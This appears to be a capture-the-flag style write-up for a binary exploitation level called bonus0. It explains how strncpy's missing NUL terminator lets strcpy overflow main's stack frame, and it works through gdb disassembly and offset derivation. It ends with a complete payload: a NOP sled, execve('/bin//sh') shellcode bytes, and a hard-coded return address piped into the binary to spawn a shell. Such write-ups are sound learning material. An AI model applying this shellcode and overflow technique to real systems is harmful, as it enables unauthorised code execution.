# Way to bonus1

## Core
`main` calls `pp(dest)` (dest = a small buffer in main's `0x40` frame) then `puts(dest)`.
`pp` reads two strings and concatenates them into `dest`. The bug is in how the two strings
are produced: `p(buf, " - ")` does `read(0, local, 0x1000)` then `strncpy(buf, local, 20)`.
`strncpy` of ≥20 bytes copies exactly 20 and **does not NUL-terminate**; `buf1`(ebp-0x30) and
`buf2`(ebp-0x1c) are exactly `0x14 = 20` bytes apart and contiguous. So `strcpy(dest, buf1)`
runs straight through buf1 into buf2 as one 40-byte string → overflow of main's small `dest`,
overwriting saved EIP. The shellcode survives in `p`'s `0x1000` read buffer on the stack.

## Decisive disass (full: `disas main`, `disas pp`, `disas p`)

```
p(buf, prompt):
<+38..45>: call read@plt         ; read(0, local=ebp-0x1008, 0x1000) — keeps FULL input on stack
<+67>:     call strchr@plt       ; strchr(local,'\n')
<+72>:     movb $0x0,(%eax)      ; newline -> NUL
<+81..99>: strncpy(buf, local, 0x14)   ; copies 20, NO NUL-terminate if input>=20
pp(dest):
<+16>: lea -0x30(%ebp) ; call p  ; p(buf1, " - ")   buf1 = ebp-0x30
<+35>: lea -0x1c(%ebp) ; call p  ; p(buf2, " - ")   buf2 = ebp-0x1c  (buf1+0x14, contiguous)
<+59>: call strcpy@plt           ; strcpy(dest, buf1) — no NUL -> flows buf1 into buf2
<+122>: call strcat@plt          ; strcat(dest, buf2) — appends again
main:
<+9>:  lea 0x16(%esp),%eax ; call pp   ; dest = esp+0x16 in a 0x40 frame
```

## Exploit
- offset 29 (derivation, gdb): feed s1=`"0123456789"*2` (20 B, fills buf1, no NUL) and s2=a
  MSF pattern. Crash `eip = 0x41336141` = bytes `"Aa3A"` = **offset 9** inside s2. So
  saved EIP sits at `dest + 20 (s1) + 9 = 29`; i.e. in s2 the return addr goes after `A`*9.

```
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa Aa0Aa1Aa2Aa3Aa4Aa5Aa
```

### Values
- 28-byte `execve("/bin//sh")` + `exit` shellcode (same stub family as [[level9]]).
- `addr = 0xbfffe6d0` (`\xd0\xe6\xff\xbf`): points into the NOP sled left by s1 inside
  `p`'s stack read buffer. The absolute value is environment-dependent, so
  **measure and exploit in the same (piped) run** — gdb and ltrace shift the stack elsewhere.

### Why `addr = 0xbfffe6d0` — full derivation
`addr` is NOT the start of the read buffer; it is a point ~96 bytes into the NOP sled.
Do **not** compute it as `buf1 - 0x1008`: `buf1` lives in `pp`'s frame while the read
buffer lives in `p`'s frame — different `ebp`, so that subtraction is meaningless (it only
*looked* right by coincidence).

Structural fact (from `disas p`), environment-independent:

```
+3   sub    $0x1018,%esp          ; p allocates a 0x1018 frame
+28  lea    -0x1008(%ebp),%eax    ; read buffer = ebp - 0x1008
+45  call   read                  ; s1 (sled+shellcode) stored here, full 0x1000 kept
```

So the landing buffer is `local = p.ebp - 0x1008`. Only its absolute value shifts per run.

Measured in gdb (break at the read call `*0x080484e1`):

```
(gdb) info registers esp          ; esp = 0xbfffe660
    ebp   = esp + 0x1018 = 0xbffff678
    local = ebp - 0x1008 = 0xbfffe670      ; buffer start
(gdb) x/4x $esp
    0xbfffe660: 0x00000000 0xbfffe670 0x00001000 0x00000000
                 fd=0       buf         size
                            ^^^^^^^^^^ read()'s 2nd arg == local == 0xbfffe670
```

Where 0xbfffe6d0 sits (gdb frame):

```
sled range:  0xbfffe670 .. 0xbfffe6d4   (100 * \x90)
shellcode:   0xbfffe6d4 .. 0xbfffe6f0   (28 bytes)
addr:        0xbfffe6d0 = local + 0x60  = 96 bytes into the sled (near its end)
```

`addr` lands inside the sled, so the hijacked `ret` hits `\x90`s and slides into the shellcode.

Environment shift (why it only fires in the piped run):

| run    | local start  | note                          |
|--------|--------------|-------------------------------|
| gdb    | 0xbfffe670   | argv[0] = long absolute path  |
| ltrace | 0xbfffe700   | ltrace injects its own frame  |
| pipe   | (unmeasured) | success proves addr ∈ sled    |

The stack base moves with argv[0] length and the environment block, so the absolute buffer
address differs per run while `local = ebp - 0x1008` stays fixed. The 100-byte NOP sled
absorbs this drift: any landing in `[local, local+100)` reaches the shellcode. That is why the
hard-coded `0xbfffe6d0` works under the real piped execution even though gdb/ltrace place the
buffer elsewhere (and thus SIGSEGV there).

### Payload

```
s1 = \x90*100 + shellcode(28)     ; NOP sled + shellcode, lives in p's read buffer
s2 = "A"*9 + addr + "B"*7         ; strcpy chain writes this past buf1 -> overwrites EIP
```

Shellcode cannot ride in s2: s2's job is the fixed-offset EIP overwrite, and 20 bytes is too
little for a NOP sled; s1's `read(,0x1000)` buffer is the roomy, persistent landing zone.
Delivery: both via **stdin**; trailing `cat` keeps stdin open so the spawned `/bin/sh` is
interactive (same idea as level5's `cat -`).

```bash
(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A"*9 + "\xd0\xe6\xff\xbf" + "B"*7'; cat) | ./bonus0
```

## Diff from previous
level9 injected shellcode onto the **heap** and hijacked a C++ **vtable pointer** via
`argv[1]`. bonus0 is a **stack** return-address overwrite driven by `strncpy`'s
no-NUL-terminate quirk: two 20-byte, non-terminated, adjacent buffers get glued by `strcpy`
into one 40-byte string that overflows main's frame. New wrinkles vs level9: input is split
across two `read` calls over **stdin**, and the shellcode is parked in `p`'s large read buffer
on the stack (jumped to via a NOP sled) instead of sitting at the overflow site.